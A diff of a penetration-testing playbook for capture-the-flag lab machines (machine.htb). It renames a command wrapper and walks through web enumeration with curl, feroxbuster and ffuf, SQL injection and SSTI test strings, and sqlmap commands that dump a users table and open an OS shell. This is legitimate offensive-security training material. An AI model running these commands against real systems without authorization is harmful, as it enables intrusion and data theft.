@@ -7,9 +7,9 @@ form's error-message difference, none of which a fuzzer surfaces.
 ## Manual read first (2 minutes, high yield)
 
 ```bash
-htb x "curl -sik http://machine.htb/ | head -60"
-htb x "whatweb -a3 http://machine.htb"
-htb x "curl -s http://machine.htb/robots.txt; curl -s http://machine.htb/sitemap.xml"
+pwnloop x "curl -sik http://machine.htb/ | head -60"
+pwnloop x "whatweb -a3 http://machine.htb"
+pwnloop x "curl -s http://machine.htb/robots.txt; curl -s http://machine.htb/sitemap.xml"
 ```
 
 Look for: framework and version in headers/meta, developer comments, email
@@ -20,7 +20,7 @@ parameter that looks like a filename or a URL.
 
 ```bash
 W=/usr/share/seclists/Discovery/Web-Content
-htb x "feroxbuster -u http://machine.htb -w $W/raft-medium-directories.txt \
+pwnloop x "feroxbuster -u http://machine.htb -w $W/raft-medium-directories.txt \
        -x php,txt,html,bak,zip -t 50 -o /engagements/$NAME/scans/ferox-80.txt"
 ```
 
@@ -31,7 +31,7 @@ If the app is clearly PHP/ASPX/etc., set `-x` to that extension plus `bak`,
 ## Vhost fuzzing
 
 ```bash
-htb x "ffuf -u http://$T/ -H 'Host: FUZZ.machine.htb' \
+pwnloop x "ffuf -u http://$T/ -H 'Host: FUZZ.machine.htb' \
        -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
        -fs <size-of-default-response> -o /engagements/$NAME/scans/vhost.json"
 ```
@@ -42,7 +42,7 @@ size from an obviously-wrong host header first.
 ## Parameter fuzzing
 
 ```bash
-htb x "ffuf -u 'http://machine.htb/page.php?FUZZ=test' \
+pwnloop x "ffuf -u 'http://machine.htb/page.php?FUZZ=test' \
        -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size>"
 ```
 
@@ -65,9 +65,9 @@ Then find where the file landed (fuzz `/uploads/`, `/images/`, the response).
 **SQL injection** — test `'`, `"`, `\`, then order-by/union. Once confirmed, go
 straight to `sqlmap` for extraction rather than hand-rolling:
 ```bash
-htb x "sqlmap -u 'http://machine.htb/x.php?id=1' --batch --dbs"
-htb x "sqlmap -u '...' --batch -D db -T users --dump"
-htb x "sqlmap -u '...' --batch --os-shell"     # when FILE privilege exists
+pwnloop x "sqlmap -u 'http://machine.htb/x.php?id=1' --batch --dbs"
+pwnloop x "sqlmap -u '...' --batch -D db -T users --dump"
+pwnloop x "sqlmap -u '...' --batch --os-shell"     # when FILE privilege exists
 ```
 
 **SSTI** — `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`. A rendered `49` means
